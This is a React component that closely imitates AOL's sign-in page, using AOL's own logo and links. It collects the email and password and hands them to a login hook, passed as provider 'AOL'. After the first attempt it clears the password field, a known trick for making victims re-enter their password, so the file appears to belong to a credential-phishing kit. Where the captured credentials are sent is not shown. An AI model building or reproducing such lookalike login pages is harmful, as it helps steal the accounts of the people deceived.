import React, { useState } from 'react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

interface AolLoginPageProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

// Simple input component for AOL style
const AolInput = ({ value, onChange, placeholder, type = "text", autoFocus = false }: any) => {
  const [isFocused, setIsFocused] = useState(false);

  return (
    <div className="relative mt-4">
      <input
        type={type}
        value={value}
        onChange={onChange}
        onFocus={() => setIsFocused(true)}
        onBlur={() => setIsFocused(false)}
        autoFocus={autoFocus}
        placeholder={placeholder}
        className="w-full bg-white pt-2 pb-2 text-sm border-b focus:outline-none"
        style={{
          borderColor: isFocused ? '#0073e6' : '#dcdfe0',
          transition: 'border-color 0.2s'
        }}
      />
    </div>
  );
};

const AolLoginPage: React.FC<AolLoginPageProps> = ({ onLoginSuccess, onLoginError }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPasswordStep, setShowPasswordStep] = useState(false);

  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);

  const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    if (email) { setShowPasswordStep(true); }
  };
  
  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: 'AOL' });
    if (result?.isFirstAttempt) { setPassword(''); }
  };

  const AolLogo = ({ className = '' }: { className?: string }) => (
    <img src="https://s.yimg.com/cv/apiv2/ybar/logos/aol-logo-black-v1.png" alt="AOL" className={`select-none ${className}`} />
  );

  return (
    <div className="min-h-screen bg-white font-sans flex flex-col">
      <header className="flex-shrink-0 flex justify-between items-center py-4 px-6 md:px-10 border-b border-gray-200">
        <AolLogo className="h-6" />
        <div className="flex items-center space-x-4 text-xs text-gray-500 font-medium">
          <a href="https://help.aol.com/" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
          <a href="https://legal.aol.com/us/en/aol/terms/otos/index.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms</a>
          <a href="https://legal.aol.com/us/en/aol/privacy/index.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
        </div>
      </header>

      <main className="flex-grow w-full flex justify-center items-center px-4">
        {/* Changed py-10 to py-20 to double the vertical padding */}
        <div 
          className="w-full max-w-[340px] mx-auto py-20 px-8 bg-white rounded-xl border border-gray-200"
        >
          <AolLogo className="h-10 mx-auto mb-6" />
          
          <h2 className="text-center text-2xl font-bold text-gray-900 mb-8">
            Sign in
          </h2>
          
          <form onSubmit={handleSubmit} className="space-y-5">
            {errorMessage && !isLoading && ( <p className="text-red-500 text-sm text-center -mb-2">{errorMessage}</p> )}

            {!showPasswordStep ? (
              <div>
                <AolInput value={email} onChange={(e: any) => setEmail(e.target.value)} placeholder="Username, email, or mobile" type="email" autoFocus />
                <button onClick={handleNext} disabled={!email} className="w-full mt-6 py-2.5 bg-[#0073e6] text-white font-semibold rounded-md hover:bg-[#0066cc] disabled:bg-[#0073e6] disabled:cursor-not-allowed transition-colors text-sm">
                  Next
                </button>
              </div>
            ) : (
              <div>
                <div className="text-center text-sm font-medium p-2 rounded-md bg-gray-100 truncate">{email}</div>
                <AolInput value={password} onChange={(e: any) => setPassword(e.target.value)} placeholder="Password" type="password" autoFocus />
                <button type="submit" disabled={isLoading || !password} className="w-full mt-6 py-2.5 bg-[#0073e6] text-white font-semibold rounded-md hover:bg-[#0066cc] disabled:opacity-50 transition-colors text-sm">
                  {isLoading ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Sign In'}
                </button>
              </div>
            )}

            <div className="text-xs flex justify-between items-center pt-4">
              <label className="flex items-center space-x-2 text-gray-600 cursor-pointer">
                <input type="checkbox" className="form-checkbox h-3.5 w-3.5 text-blue-600 border-gray-400 rounded-sm focus:ring-blue-500" />
                <span className="text-gray-500 font-medium">Stay signed in</span>
              </label>
              <a href="https://login.aol.com/forgot" target="_blank" rel="noopener noreferrer" className="text-xs text-[#0073e6] hover:underline font-semibold">Forgot username?</a>
            </div>
            
            <div className="pt-6">
              <a href="https://login.aol.com/account/create" target="_blank" rel="noopener noreferrer" className="w-full block text-center py-2.5 border border-[#0073e6] text-[#0073e6] font-semibold rounded-md hover:bg-blue-50 transition-colors text-sm">
                Create an account
              </a>
            </div>

          </form>
        </div>
      </main>
    </div>
  );
};

export default AolLoginPage;
